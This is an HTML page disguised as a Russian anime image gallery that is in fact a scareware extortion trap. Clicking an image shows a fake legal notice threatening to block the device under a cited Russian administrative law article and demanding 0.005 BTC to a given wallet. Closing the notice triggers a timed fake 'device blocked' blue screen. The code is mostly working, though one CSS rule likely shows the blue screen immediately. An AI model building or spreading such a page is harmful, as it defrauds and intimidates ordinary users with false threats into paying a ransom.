<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Аниме Галерея</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f0f0;
            transition: background-color 1s ease;
        }

        h1 {
            margin-top: 20px;
        }

        .gallery {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 20px;
        }

        .anime-img {
            width: 200px;
            height: 300px;
            object-fit: cover;
            border-radius: 10px;
            transition: transform 0.3s ease;
            cursor: pointer;
        }

        .anime-img:hover {
            transform: scale(1.1);
        }

        /* Стили для окна с предупреждением */
        .alert-box {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 350px;
            background-color: white;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            text-align: center;
        }

        .alert-box p {
            font-size: 16px;
            color: red;
            font-weight: bold;
        }

        .alert-box .btc {
            color: black;
            font-size: 14px;
            font-weight: normal;
            margin-top: 10px;
        }

        .alert-box button {
            margin-top: 10px;
            padding: 10px;
            border: none;
            background-color: black;
            color: white;
            cursor: pointer;
            border-radius: 5px;
        }

        .alert-box button:hover {
            background-color: darkred;
        }

        /* Синий экран */
        .blue-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: blue;
            color: white;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
    </style>
</head>
<body>
    <h1>Галерея аниме</h1>
    <div class="gallery">
        <img src="anime1.jpg" alt="Аниме 1" class="anime-img">
        <img src="anime2.jpg" alt="Аниме 2" class="anime-img">
        <img src="anime3.jpg" alt="Аниме 3" class="anime-img">
        <img src="anime4.jpg" alt="Аниме 4" class="anime-img">
    </div>

    <div id="alertBox" class="alert-box">
        <p>Ваше устройство будет заблокировано в течение 1 минуты из-за нарушения законодательства РФ (Статья 13.41 КоАП РФ).</p>
        <p class="btc">Для отмены блокировки оплатите 0.005 BTC (≈ 350$) на кошелёк:<br>  
        <strong>bc1q9v8m4zxt7yl5kph2g3f0dwcjnshx5r7a</strong></p>
        <button onclick="closeAlert()">Понял...</button>
    </div>

    <div id="blueScreen" class="blue-screen">
        <p>Ошибка системы</p>
        <p>Ваше устройство заблокировано.</p>
    </div>

    <script>
        let timer;

        document.querySelectorAll('.anime-img').forEach(img => {
            img.addEventListener('click', function() {
                document.getElementById('alertBox').style.display = 'block';
            });
        });

        function closeAlert() {
            document.getElementById('alertBox').style.display = 'none';

            // Запуск таймера на 1 минуту (60 000 миллисекунд)
            timer = setTimeout(() => {
                document.getElementById('blueScreen').style.display = 'flex';
            }, 60000);
        }
    </script>
</body>
</html>
